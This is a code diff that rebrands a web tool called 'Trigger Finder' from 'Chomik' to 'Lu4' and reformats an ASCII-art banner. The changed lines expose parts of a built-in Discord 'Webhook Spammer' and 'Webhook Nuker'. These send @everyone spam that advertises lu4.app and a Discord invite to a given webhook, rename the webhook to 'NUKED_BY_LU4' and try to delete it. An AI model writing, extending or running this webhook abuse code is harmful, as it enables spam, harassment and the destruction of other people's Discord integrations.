@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Corrected viewport meta tag -->
   <!-- Favicon -->
   <link rel="icon" href="chomik.jpg" type="image/jpeg">
-  <title>Trigger Finder</title>
+  <title>Lu4 Trigger Finder</title>
   <!-- Use Fira Code font -->
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
   <!-- Include Font Awesome for icons -->
@@ -526,7 +526,7 @@
     <div class="container">
       <!-- Finder App as a component -->
       <div id="finder-app" class="component"> <!-- Changed ID, added class -->
-        <h1><i class="fas fa-search"></i> Trigger Finder</h1> <!-- Added icon -->
+        <h1><i class="fas fa-search"></i> Lu4 Trigger Finder</h1> <!-- Added icon -->
 
         <!-- Search and Filter Row -->
         <div class="search-filter-row">
@@ -606,7 +606,7 @@
     // function updateTitleWithEmoji() { ... }
     // setInterval(updateTitleWithEmoji, 500);
     // updateTitleWithEmoji();
-    document.title = "🔍 Chomik Trigger Finder 🔍"; // Set a static title
+    document.title = "🔍 Lu4 Trigger Finder 🔍"; // Set a static title
 
     // --- Merged JavaScript from skidTriggerCreator ---
 
@@ -833,17 +833,22 @@
     // Download Button (no changes needed if using `allTriggers` and `allShops`)
     downloadButton.addEventListener('click', () => {
       // ... (keep existing ASCII art and text generation logic) ...
-            const asciiArt = 
-
-                                      __          _    _                               
+            const asciiArt = `
+                                       __          _    _                               
                                      [  |        | |  | |                              
  _   _   __  _   _   __  _   _   __   | | __   _ | |__| |_     ,--.  _ .--.   _ .--.   
-[ \ [ \ [  ][ \ [ \ [  ][ \ [ \ [  ]  | |[  | | ||____   _|   `'_\ :[ '/'`\ \[ '/'`\ \ 
- \ \/\ \/ /  \ \/\ \/ /  \ \/\ \/ /_  | | | \_/ |,   _| |_  _ // | |,| \__/ | | \__/ | 
-  \__/\__/    \__/\__/    \__/\__/(_)[___]'.__.'_/  |_____|(_)\'-;__/| ;.__/  | ;.__/  
-                                                                    [__|     [__|      
+[ \\ [ \\ [  ][ \\ [ \\ [  ][ \\ [ \\ [  ]  | |[  | | ||____   _|   \\\`'_\\ :[ '/'\\` \\\\ \\[ '/'\\` \\\\ \\ 
+ \\ \\/\\ \\/ /  \\ \\/\\ \\/ /  \\ \\/\\ \\/ /_  | | | \\_/ |,   _| |_  _ // | |,| \\__/ | | \\__/ | 
+  \\__/\\__/    \\__/\\__/    \\__/\\__/(_)[___]'.__.'_/  |_____|(_)\\'-;__/| ;.__/  | ;.__/  
+                                                                    [__|     [__|
 
-;
+     _  _                            _                     __          __  __   ___        _  _     ___   _        ___   __ __
+  __| |(_) ___   ___  ___   _ __  __| |    __ _   __ _    / /__      __\\\\ \\\\/ /  / _ \\\\ _ __ | || |   ( _ ) | |__    /   \\\\ /__\\\\\\\\ \\\\
+ / _\\\` || |/ __| / __|/ _ \\\\ | '__|/ _\\\` |   / _\\\` | / _\\\` |  / / \\\\ \\\\ /\\\\ / / \\\\  /  / /_)/| '__|| || |_  / _ \\\\ | '_ \\\\  / /\\\\ //_\\\\   \\\\ \\\\
+| (_| || |\\\\__ \\\\| (__| (_) || |  | (_| | _| (_| || (_| | / /   \\\\ V  V /  /  \\\\ / ___/ | |   |__   _|| (_) || |_) |/ /_////__/\\\\_/ /
+ \\\\__,_||_||___/ \\\\___|\\\\___/ |_|   \\\\__,_|(_)\\\\__, | \\\\__, |/_/     \\\\_/\\\\_/  /_/\\\\_\\\\\\\\/     |_|      |_|   \\\\___/ |_.__//___,' \\\\__/\\\\___/
+                                          |___/  |___/
+`;
 
       const triggersText = allTriggers.length > 0
         ? allTriggers.map(trigger => `Trigger: ${trigger.trigger}\nFolder: ${trigger.folder}\n--------------------------`).join('\n')
@@ -868,7 +873,7 @@
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
-      a.download = 'chomik_finder_results.txt'; // More descriptive filename
+      a.download = 'lu4_finder_results.txt'; // More descriptive filename
       document.body.appendChild(a); // Append to body for Firefox compatibility
       a.click();
       document.body.removeChild(a); // Clean up
@@ -1068,7 +1073,7 @@
                         'Content-Type': 'application/json',
                     },                    body: JSON.stringify({
                         content: content,
-                        username: 'Chomik Webhook Spammer',
+                        username: 'Lu4 Webhook Spammer',
                         avatar_url: 'https://imagedelivery.net/HL_Fwm__tlvUGLZF2p74xw/b5242d9e-b8db-4957-d35d-76442ed70c00/public'
                     })
                 });
@@ -1174,7 +1179,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     content: '**YOUR WEBHOOK HAS BEEN NUKED BY www.lu4.app** @everyone\nJoin us: https://discord.gg/wXPr48bDEJ',
-                    username: 'Chomik Webhook Nuker',
+                    username: 'Lu4 Webhook Nuker',
                     avatar_url: 'https://imagedelivery.net/HL_Fwm__tlvUGLZF2p74xw/b5242d9e-b8db-4957-d35d-76442ed70c00/public',
                     allowed_mentions: { parse: ['everyone'] }
                 })
@@ -1202,7 +1207,7 @@
                  await fetch(webhook, {
                      method: 'PATCH',
                      headers: { 'Content-Type': 'application/json' },
-                     body: JSON.stringify({ name: 'NUKED_BY_CHOMIK' })
+                     body: JSON.stringify({ name: 'NUKED_BY_LU4' })
                  });
                  statusElement.textContent = '⚠️ Nuke Attempted (Delete Failed)';
                  statusElement.style.color = '#ffa500';
